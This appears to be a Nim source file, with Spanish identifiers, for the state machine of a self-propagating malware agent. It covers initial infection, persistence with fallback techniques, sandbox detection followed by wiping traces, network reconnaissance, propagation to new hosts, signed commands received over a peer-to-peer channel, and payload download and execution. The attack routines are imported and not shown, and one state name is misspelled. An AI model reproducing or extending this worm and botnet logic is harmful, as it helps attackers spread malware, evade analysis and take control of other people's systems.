import times, tables, deques
from agent import Agente, actualizarMetricasTiempo, registrarError
from events import EventoAgente, EventoAgenteKind
from state_actions import iniciarPersistencia, intentarPersistenciaConTecnica, iniciarReconocimiento, prepararAtaque, solicitarObjetivosP2P, actualizarMetricasPropagacion, continuarReconocimiento, intentarConTecnicaAlternativa, continuarPropagacion, descargarPayload, reconectarP2P, activarModoFallback, solicitarNuevoPayload, iniciarProtocoloLimpieza, reportarResultado, limpiarRecursosPayload, limpiarRastros, terminarEjecucion
from logger import logEvent, logInfo, logWarning, logCritical, logError
from recovery import intentarRecuperacion, seleccionarTecnicaAlternativa
from validation import validarFirmaComando

const
  MAX_REINTENTOS_P2P = 3
  # Timeouts en segundos por estado
  TimeoutsPorEstado = {
    EstadoAgente.Inicial: 30.0,
    EstadoAgente.Persistencia: 120.0,
    Estadoagente.Reconocimiento: 300.0,
    EstadoAgente.Propagacion: 600.0,
    EstadoAgente.ComunicacionP2P: 1800.0,
    EstadoAgente.EjecucionPayload: 900.0,
    EstadoAgente.Error: 10.0
  }.toTable()

type
  EstadoMetricas* = object
    tiempoAcumulado: float
    conteoTransiciones: int
    exito: bool

proc manejarEvento*(agente: var Agente, evento: EventoAgente) {.raises: [AgenteError, ValueError].} =
  ## Procesa un evento y transiciona el estado del agente según la lógica de la FSM
  # Validaciones iniciales
  if agente.isNil:
    raise newException(ValueError, "Agente no inicializado")
  
  if evento.timestamp == 0:
    raise newException(ValueError, "Evento sin timestamp válido")
  
  if agente.estado notin TimeoutsPorEstado:
    raise newException(ValueError, "Estado actual no definido: " & $agente.estado)
  
  # Registrar el evento para análisis
  logEvent(agente, evento)
  
  # Actualizar métricas de tiempo en estado actual
  actualizarMetricasTiempo(agente)
  
  # Procesar según estado actual y tipo de evento
  case (agente.estado, evento.kind)
  
  # ----- ESTADO_INICIAL -----
  of (EstadoAgente.Inicial, EventoAgenteKind.InfeccionInicial):
    agente.estadoAnterior = agente.estado
    agente.estado = EstadoAgente.Persistencia
    agente.tiempoEntradaEstado = getTime().toUnix()
    logInfo("Transición: Inicial → Persistencia (InfeccionInicial)")
    iniciarPersistencia(agente)
  
  of (EstadoAgente.Inicial, EventoAgenteKind.SandboxDetectado):
    agente.estadoAnterior = agente.estado
    agente.estado = EstadoAgente.Error
    agente.tiempoEntradaEstado = getTime().toUnix()
    logCritical("Entorno de análisis detectado, terminando operaciones")
    limpiarRastros(agente)
    registrarError(agente, evento.msg, evento.codigo, evento.contexto)
    terminarEjecucion(agente)
  
  # ----- ESTADO_PERSISTENCIA -----
  of (EstadoAgente.Persistencia, EventoAgenteKind.PersistenciaExitosa):
    agente.estadoAnterior = agente.estado
    agente.estado = EstadoAgente.Reconocimiento
    agente.tiempoEntradaEstado = getTime().toUnix()
    logInfo("Transición: Persistencia → Reconocimiento (PersistenciaExitosa)")
    iniciarReconocimiento(agente)
  
  of (EstadoAgente.Persistencia, EventoAgenteKind.PersistenciaFallida):
    logWarning("Persistencia fallida: " & evento.error)
    let tecnicaAlternativa = seleccionarTecnicaAlternativa(agente)
    if tecnicaAlternativa != "":
      logInfo("Intentando técnica alternativa: " & tecnicaAlternativa)
      intentarPersistenciaConTecnica(agente, tecnicaAlternativa)
    else:
      logError("No hay más técnicas de persistencia disponibles")
      agente.estadoAnterior = agente.estado
      agente.estado = EstadoAgente.Error
      agente.tiempoEntradaEstado = getTime().toUnix()
      registrarError(agente, "Persistencia fallida", 500, evento.contexto)
  
  # ----- ESTADO_RECONOCIMIENTO -----
  of (EstadoAgente.Reconocimiento, EventoAgenteKind.ObjetivoEncontrado):
    agente.estadoAnterior = agente.estado
    agente.estado = EstadoAgente.Propagacion
    agente.tiempoEntradaEstado = getTime().toUnix()
    logInfo("Transición: Reconocimiento → Propagacion (ObjetivoEncontrado)")
    prepararAtaque(agente, evento.contexto)
  
  of (EstadoAgente.Reconocimiento, EventoAgenteKind.Timeout):
    if evento.tipoTimeout == "network_scan":
      logInfo("Timeout de escaneo, solicitando objetivos a P2P")
      solicitarObjetivosP2P(agente)
    else:
      logWarning("Timeout desconocido en Reconocimiento: " & evento.tipoTimeout)
  
  # ----- ESTADO_PROPAGACION -----
  of (EstadoAgente.Propagacion, EventoAgenteKind.InfeccionExitosa):
    agente.estadoAnterior = agente.estado
    agente.estado = EstadoAgente.Reconocimiento
    agente.tiempoEntradaEstado = getTime().toUnix()
    logInfo("Transición: Propagacion → Reconocimiento (InfeccionExitosa)")
    actualizarMetricasPropagacion(agente, exito = true)
    continuarReconocimiento(agente)
  
  of (EstadoAgente.Propagacion, EventoAgenteKind.InfeccionFallida):
    logInfo("Propagación fallida para objetivo: " & evento.error)
    actualizarMetricasPropagacion(agente, exito = false)
    if evento.contexto.hasKey("tecnica_usada"):
      intentarConTecnicaAlternativa(agente, evento.contexto)
    else:
      continuarPropagacion(agente)
  
  of (EstadoAgente.Propagacion, EventoAgenteKind.PropagacionCompleta):
    logInfo("Propagación completa, sin más objetivos")
    agente.estadoAnterior = agente.estado
    agente.estado = EstadoAgente.ComunicacionP2P
    agente.tiempoEntradaEstado = getTime().toUnix()
  
  # ----- ESTADO_COMUNICACION_P2P -----
  of (EstadoAgente.ComunicacionP2P, EventoAgenteKind.ComandoRecibido):
    agente.estadoAnterior = agente.estado
    agente.estado = EstadoAgente.EjecucionPayload
    agente.tiempoEntradaEstado = getTime().toUnix()
    logInfo("Transición: ComunicacionP2P → EjecucionPayload (ComandoRecibido)")
    if not validarFirmaComando(agente, evento.comando):
      logWarning("Comando con firma inválida, descartando")
      agente.estado = EstadoAgente.ComunicacionP2P
      return
    descargarPayload(agente, evento.comando)
  
  of (EstadoAgente.ComunicacionP2P, EventoAgenteKind.ConexionP2PFallida):
    logWarning("Conexión P2P fallida: " & evento.error)
    if evento.contexto.hasKey("reintentos"):
      let reintentos = evento.contexto["reintentos"].getInt()
      if reintentos < MAX_REINTENTOS_P2P:
        logInfo("Reintentando conexión P2P (intento " & $reintentos & ")")
        reconectarP2P(agente, reintentos + 1)
      else:
        logWarning("Máximo de reintentos P2P alcanzado, usando fallback")
        activarModoFallback(agente)
    else:
      reconectarP2P(agente, 1)
  
  of (EstadoAgente.ComunicacionP2P, EventoAgenteKind.Timeout):
    logInfo("Timeout sin actividad en ComunicacionP2P, cambiando a modo pasivo")
    agente.estadoAnterior = agente.estado
    agente.estado = EstadoAgente.Reconocimiento
    agente.tiempoEntradaEstado = getTime().toUnix()
  
  # ----- ESTADO_EJECUCION_PAYLOAD -----
  of (EstadoAgente.EjecucionPayload, EventoAgenteKind.PayloadFinalizado):
    agente.estadoAnterior = agente.estado
    agente.estado = EstadoAgente.ComunicacionP2P
    agente.tiempoEntradaEstado = getTime().toUnix()
    logInfo("Transición: EjecucionPayload → ComunicacionP2P (PayloadFinalizado)")
    reportarResultado(agente, evento.contexto)
    limpiarRecursosPayload(agente)
  
  of (EstadoAgente.EjecucionPayload, EventoAgenteKind.PayloadCorrupto):
    agente.estadoAnterior = agente.estado
    agente.estado = EstadoAgente.ComunicacionP2P
    agente.tiempoEntradaEstado = getTime().toUnix()
    logError("Payload corrupto: " & evento.error)
    solicitarNuevoPayload(agente, evento.contexto["hash_original"].getStr())
  
  # ----- MANEJO DE ERRORES CRÍTICOS (en cualquier estado) -----
  of (_, EventoAgenteKind.ErrorCritico):
    logCritical("Error crítico: " & evento.msg & " (código: " & $evento.codigo & ")")
    agente.estadoAnterior = agente.estado
    agente.estado = EstadoAgente.Error
    agente.tiempoEntradaEstado = getTime().toUnix()
    registrarError(agente, evento.msg, evento.codigo, evento.contexto)
    iniciarProtocoloLimpieza(agente)
  
  # ----- TRANSICIONES NO VÁLIDAS -----
  else:
    logWarning("Transición no válida desde " & $agente.estado & " con evento " & $evento.kind)
    agente.eventosPendientes.addLast(evento)
    intentarRecuperacion(agente)

proc verificarTimeout*(agente: var Agente) =
  ## Verifica si el tiempo en el estado actual ha excedido el timeout permitido
  let tiempoActual = getTime().toUnix()
  let tiempoEnEstado = tiempoActual - agente.tiempoEntradaEstado
  let timeoutMaximo = TimeoutsPorEstado[agente.estado]
  
  if tiempoEnEstado > timeoutMaximo.int64:
    logWarning("Timeout en estado " & $agente.estado & 
              " (tiempo: " & $tiempoEnEstado & "s)")
    
    var eventoTimeout: EventoAgente
    case agente.estado
    of EstadoAgente.Reconocimiento:
      eventoTimeout = EventoAgente(
        kind: EventoAgenteKind.Timeout,
        tipoTimeout: "network_scan",
        duracion: tiempoEnEstado.float,
        timestamp: tiempoActual
      )
    of EstadoAgente.Propagacion:
      eventoTimeout = EventoAgente(
        kind: EventoAgenteKind.Timeout,
        tipoTimeout: "propagation",
        duracion: tiempoEnEstado.float,
        timestamp: tiempoActual
      )
    of EstadoAgente.ComunicacionP2P:
      eventoTimeout = EventoAgente(
        kind: EventoAgenteKind.Timeout,
        tipoTimeout: "p2p",
        duracion: tiempoEnEstado.float,
        timestamp: tiempoActual
      )
    else:
      eventoTimeout = EventoAgente(
        kind: EventoAgenteKind.Timeout,
        tipoTimeout: "generic",
        duracion: tiempoEnEstado.float,
        timestamp: tiempoActual
      )
    
    manejarEvento(agente, eventoTimeout)

proc gestionarEventosPendientes*(agente: var Agente) =
  ## Procesa eventos pendientes según prioridad
  var eventosCriticos: Deque[EventoAgente]
  var eventosComandos: Deque[EventoAgente]
  var eventosNormales: Deque[EventoAgente]
  
  # Clasificar eventos por prioridad
  for evento in agente.eventosPendientes:
    case evento.prioridad
    of PrioridadEvento.Critico: eventosCriticos.addLast(evento)
    of PrioridadEvento.Comando: eventosComandos.addLast(evento)
    of PrioridadEvento.Normal: eventosNormales.addLast(evento)
  
  # Procesar en orden de prioridad
  while eventosCriticos.len > 0 or eventosComandos.len > 0 or eventosNormales.len > 0:
    if eventosCriticos.len > 0:
      let evento = eventosCriticos.popFirst()
      manejarEvento(agente, evento)
    elif eventosComandos.len > 0:
      let evento = eventosComandos.popFirst()
      manejarEvento(agente, evento)
    else:
      let evento = eventosNormales.popFirst()
      manejarEvento(agente, evento)
  
  agente.eventosPendientes.clear()

proc iniciarFSM*(agente: var Agente) =
  ## Inicializa la máquina de estados finitas
  agente.estado = EstadoAgente.Inicial
  agente.tiempoEntradaEstado = getTime().toUnix()
  agente.eventosPendientes = initDeque[EventoAgente]()
  logInfo("FSM inicializada en estado Inicial")
